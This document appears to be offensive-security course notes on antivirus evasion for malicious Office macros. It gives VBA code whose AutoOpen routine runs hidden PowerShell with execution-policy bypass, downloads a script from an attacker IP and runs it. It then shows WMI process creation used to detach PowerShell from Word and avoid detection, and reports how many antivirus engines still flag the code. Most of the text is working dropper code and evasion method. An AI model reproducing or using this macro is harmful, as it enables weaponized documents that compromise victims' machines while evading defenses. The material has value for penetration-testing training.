## Problem with old code
Our old powershell vba shellcode runner looks something as follows:
```VBA
Sub MyMacro()
  Dim strArg As String
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.150/run.txt'))"
  Shell strArg, vbHide
End Sub
```

There are 2 main problems with this code:
1. The use of _Shell_ function, which can prove to be a red flag for most antivirus products.
2. The powershell download cradle, which also can be another red flag.

## Solution
To address these issues, we'll first address the issue of PowerShell being a child process of the Office program by leveraging the _Windows Management Instrumentation_ (WMI) framework.

We'll first connect to WMI from VBA, which is done through the _GetObject_ method, specifying the [_winmgmts_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/winmgmt) class name.
Winmgmt is the WMI service within the SVCHOST process running under the LocalSystem account.

When performing an action, the Winmgmt WMI service is created in a separate process as a child process of _Wmiprvse.exe_, which means we can de-chain the PowerShell process from Microsoft Word.

WMI is divided into [_Providers_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-providers) that contain different functionalities, and each provider contains multiple classes that can be instantiated. To create a PowerShell process, we want to use the [_Win32_Process_](https://docs.microsoft.com/en-gb/windows/win32/cimwin32prov/win32-process) class from the [_Win32_](https://docs.microsoft.com/en-gb/windows/win32/cimwin32prov/win32-provider) provider.
To create a new process, we'll use the _Get_ method to select the _Win32_Process_ class and invoke the _Create_[8](https://portal.offensive-security.com/courses/pen-300/books-and-videos/modal/modules/introduction-to-antivirus-evasion/hiding-power-shell-inside-vba/dechaining-with-wmi#fn8) method.

Our new code will look as follows:
```VBA
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.150/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

In this, The _Create_ method accepts four arguments:
1. Name of process with arguments
2. Process creation information(null)
3. Same as 3 (null)
4. Dynamic process id (pid)

Even though our code is still being detected by 7/26 antivirus products from Antiscan.Me, this is a good step.
We can now start the obfuscation of our code to make our code even better.
